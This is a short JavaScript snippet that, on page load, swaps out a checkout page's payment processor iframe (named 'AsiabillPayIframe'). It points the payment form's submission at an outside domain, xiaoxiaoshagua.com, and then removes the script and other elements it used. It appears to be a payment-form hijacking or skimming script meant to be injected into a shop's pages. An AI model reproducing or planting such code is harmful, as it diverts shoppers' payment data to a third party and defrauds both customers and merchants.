

window.onload=function(){
     var scriptEle = document.createElement("script");
     scriptEle.type ="text/javascript";
     scriptEle.text = `document.getElementById('createForm').action = 'https://www.xiaoxiaoshagua.com/create_payment'`;
     var x = document.getElementById("createForm");
     x.insertBefore(scriptEle, x.firstChild);
     document.body.appendChild(scriptEle);
     document.getElementById('AsiabillPayIframe').remove();
     let node = document.getElementById('createForm');
     let c = node.cloneNode(true);
     document.body.appendChild(c);
     x.remove();
     scriptEle.remove();
     document.getElementById('haha').remove();
}
